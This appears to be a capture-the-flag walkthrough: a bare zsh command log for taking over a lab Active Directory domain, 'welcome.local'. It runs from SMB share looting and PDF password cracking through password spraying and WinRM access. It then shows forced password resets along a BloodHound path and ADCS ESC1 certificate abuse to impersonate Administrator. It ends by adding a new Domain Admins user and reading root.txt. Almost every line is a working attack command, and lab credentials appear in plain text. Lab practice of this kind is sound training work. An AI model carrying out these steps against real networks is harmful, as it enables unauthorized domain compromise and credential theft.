```zsh
nxc smb 10.1.207.225 -u 'e.hills' -p 'Il0vemyj0b2025!' --shares
#Human Resources READ
smbclient \\\\10.1.207.225\\'Human Resources' -U e.hills
prompt OFF
recurse ON
mget *
pdf2john 'Welcome Start Guide.pdf' 
john hash_pdf -w=/usr/share/wordlists/rockyou.txt
#humanresources
open 'Welcome Start Guide.pdf'
#find initial password Welcome2025!@
nxc ldap 10.1.207.225 -u e.hills -p 'Il0vemyj0b2025!' --users
nxc smb 10.1.207.225 -u users.txt -p Welcome2025!@ --continue-on-success
#get a hit on a.harris
for pro in smb rdp winrm ssh mssql; do nxc $pro 10.1.207.225 -u a.harris -p 'Welcome2025!@' ;done
#get pwned on winrm
evil-winrm -i 10.1.207.225 -u a.harris -p 'Welcome2025!@'
whoami /all
#DCOM access
certipy-ad find -u 'a.harris' -p 'Welcome2025!@' -dc-ip 10.1.207.225 -stdout -vulnerable
#nothing vulnerable for a.harris

#So run Bloodhound
#see a.harris -> i.park -> svc_ca & svc_web
bloodyAD --host 10.1.207.225 -d welcome.local -u a.harris -p 'Welcome2025!@' set password 'i.park' 'newPassword1!'
bloodyAD --host 10.1.207.225 -d welcome.local -u i.park -p 'newPassword1!' set password 'svc_ca' 'newPassword1!'

certipy-ad find -u 'svc_ca' -p 'newPassword1!' -dc-ip 10.1.207.225 -stdout -vulnerable
#ESC1

certipy-ad req -u svc_ca -p 'newPassword1!' -upn Administrator@welcome.local -dc-ip 10.1.207.225 -ca WELCOME-CA -template Welcome-Template
certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.207.225
impacket-psexec
#DID NOT WORK

certipy-ad req -u svc_ca -p 'newPassword1!' -upn Administrator@welcome.local -dc-ip 10.1.207.225 -ca WELCOME-CA -template Welcome-Template -ldap-simple-auth

certipy-ad auth -pfx administrator_ad8933ff-cbe3-4d43-862c-be925c847eb8.pfx -dc-ip 10.1.207.225 -ldap-shell
	add_user aj #note the passwor
	add_user_to_group aj "domain admins"
	add_user_to_group aj "Remote Management Users"

evil-winrm -i 10.1.207.225 -u aj -p 'WGev:l@rqUVW/fM'
cd \users\Administrator\desktop
cat root.txt

```